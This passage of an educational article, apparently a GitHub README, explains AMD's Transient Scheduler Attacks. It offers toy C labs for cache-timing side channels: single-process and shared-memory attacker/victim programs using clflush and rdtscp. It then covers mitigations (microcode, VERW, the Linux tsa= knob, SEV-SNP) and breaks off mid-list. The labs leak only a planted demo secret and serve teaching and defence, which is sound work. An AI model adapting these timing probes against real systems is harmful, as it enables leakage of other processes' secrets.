    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-c">// Flush entire probe_array from caches</span>
<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-c">// Measure time to access probe_array[idx * STRIDE]</span>
<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned <span class="pl-smi">int</span></span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);

    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-c">// 1. Initialize array to force allocation</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-c">// Attacker chooses a hint. For simplicity we fix it.</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span>;

    <span class="pl-c">// 2. Flush the probe_array from cache</span>
    <span class="pl-en">flush_probe_array</span>();

    <span class="pl-c">// 3. Trigger victim many times to strengthen the signal</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-c">// 4. Measure timing for each possible index and find fastest</span>
    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (time = %u cycles)\\n"</span>, <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Recover an approximation of the secret</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>What’s happening here:</p>
<ul>
<li>The victim repeatedly touches <code>probe_array[(attacker_hint ^ secret) * STRIDE]</code>,</li>
<li>That specific cache line becomes hot,</li>
<li>The attacker times every index and infers which is fastest,</li>
<li>From that <code>best_idx</code>, it guesses <code>secret ≈ attacker_hint ^ best_idx</code>.</li>
</ul>
<p>This is the <strong>same mental structure</strong> as real microarchitectural leaks: you never read the secret directly; you watch how <strong>transient microarchitectural state changes timing</strong>.</p>
<p>On a modern CPU, you may need to run it multiple times, average results, or tweak <code>PROBE_SIZE</code> / <code>STRIDE</code> to get a clear signal.</p>
<div class="markdown-heading"><h3 class="heading-element">4.2 Variant without <code>rdtsc</code>: using <code>clock_gettime</code>
</h3><a id="user-content-42-variant-without-rdtsc-using-clock_gettime" class="anchor" aria-label="Permalink: 4.2 Variant without rdtsc: using clock_gettime" href="#42-variant-without-rdtsc-using-clock_gettime"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want a version that doesn’t rely on <code>rdtsc</code> (e.g., on some systems it may be restricted or noisy), here’s a variant using <code>clock_gettime</code> with <code>CLOCK_MONOTONIC_RAW</code>. It’s less precise but more portable.</p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy_posix tsa_toy_posix.c</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;time.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x2A</span>;  <span class="pl-c">// 42 decimal</span>

<span class="pl-k">static</span> <span class="pl-k">inline</span> <span class="pl-smi">uint64_t</span> <span class="pl-en">nsec_now</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">struct</span> <span class="pl-smi">timespec</span> <span class="pl-s1">ts</span>;
    <span class="pl-en">clock_gettime</span>(<span class="pl-c1">CLOCK_MONOTONIC_RAW</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ts</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint64_t</span>)<span class="pl-s1">ts</span>.<span class="pl-c1">tv_sec</span> <span class="pl-c1">*</span> <span class="pl-c1">1000000000ull</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span>.<span class="pl-c1">tv_nsec</span>;
}

<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-smi">uint64_t</span> <span class="pl-en">time_access_ns</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();

    <span class="pl-k">return</span> <span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>;
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x05</span>;

    <span class="pl-c">// Simple multiple trials to average timing</span>
    <span class="pl-k">const</span> <span class="pl-smi">int</span> <span class="pl-s1">trials</span> <span class="pl-c1">=</span> <span class="pl-c1">50</span>;

    <span class="pl-c">// prime+victim</span>
    <span class="pl-en">flush_probe_array</span>();
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT64_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;
        <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">trials</span>; <span class="pl-s1">t</span><span class="pl-c1">++</span>) {
            <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-en">time_access_ns</span>(<span class="pl-s1">idx</span>);
        }
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">avg</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span> / <span class="pl-s1">trials</span>;

        <span class="pl-k">if</span> (<span class="pl-s1">avg</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">avg</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (avg time = %llu ns)\\n"</span>,
           <span class="pl-s1">best_idx</span>, (<span class="pl-smi">unsigned long long</span>)<span class="pl-s1">best_time</span>);

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This looks similar to the timing setups in CPU side-channel courses and Spectre labs, where you average many samples to separate cache hits from misses.</p>
<div class="markdown-heading"><h3 class="heading-element">4.3 Splitting victim and attacker (two processes, shared memory)</h3><a id="user-content-43-splitting-victim-and-attacker-two-processes-shared-memory" class="anchor" aria-label="Permalink: 4.3 Splitting victim and attacker (two processes, shared memory)" href="#43-splitting-victim-and-attacker-two-processes-shared-memory"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>To make the lab feel more like a <strong>cross-process leak</strong> (closer to TSA’s “other context” threat model), you can separate victim and attacker into <strong>two processes</strong> that share memory via <code>shm_open</code> / <code>mmap</code>.</p>
<p><strong>Shared header:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// common.h</span>
<span class="pl-k">#pragma</span> once
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
